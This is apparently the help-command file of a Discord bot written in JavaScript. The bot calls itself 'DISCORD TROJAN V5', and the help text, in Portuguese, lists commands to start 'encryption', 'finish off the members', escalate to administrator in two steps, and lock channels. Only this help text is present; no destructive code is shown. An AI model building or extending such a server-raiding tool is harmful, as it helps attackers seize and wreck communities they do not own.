const Discord = require("discord.js")
module.exports.run = async (client, message, args) => {
  
  const msgembed = new Discord.MessageEmbed()
  .setTitle(`ds4`)
  .setDescription(`
 ________________________
< HELP DISCORD TROJAN V5 >
 ------------------------
 
O Bot e totalmente seguro ele tem uma chave de ativaçao que muda a cada semana para ninguem sair destruindo servidor por ai`)
message.channel.send(msgembed)
  
 message.channel.send(`COMANDOS: \n $help - Te da a lista de comandos \n $start = começa a encriptaçao \n $final - acaba com os membros! \n $msg Manda a mensagem para avisar os membros (faça isso depois que executar $start) \n $admin1 Primeira Etapa de instalaçao para voce ter administrador \n $admin2 Segunda Etapa de instalaçao para voce ter administrador \n $lock bloqueia o canal para alguns usuarios! \n $unlock desbloqueia o canal`)
}